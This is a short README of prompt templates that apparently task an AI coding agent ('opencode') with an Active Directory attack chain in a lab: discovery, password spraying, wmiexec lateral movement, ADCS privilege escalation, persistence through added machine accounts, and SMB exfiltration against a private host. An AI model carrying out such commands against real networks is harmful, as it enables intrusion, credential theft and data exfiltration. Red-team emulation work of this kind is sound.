# Attacker opencode prompt templates

English only. Run on the attacker host with the matching skill installed. Shared runtime lives in [ad-attack/SKILL.md](ad-attack/SKILL.md).

## ad-discovery

```text
opencode run "Use the ad-discovery skill: execute discovery.orientation against domain."
```

## ad-credential

```text
opencode run "Use the ad-credential skill: using the usernames of wordlists, execute credential.password-spray against domain."
```

## ad-lateral

```text
opencode run "Use the ad-lateral skill: using the password of user alice, execute lateral.exec-wmiexec against host 172.16.24.11."
```

## ad-collection

```text
opencode run "Use the ad-collection skill: execute collection.archive against domain."
```

## ad-persistence

```text
opencode run "Use the ad-persistence skill: using the machine_account of campaign, execute persistence.add-computer against domain."
```

## ad-privesc

```text
opencode run "Use the ad-privesc skill: using the password of user alice, execute privesc.adcs-find against domain."
```

## ad-exfil

```text
opencode run "Use the ad-exfil skill: using the password of user alice, execute exfil.smb against host 172.16.24.11."
```
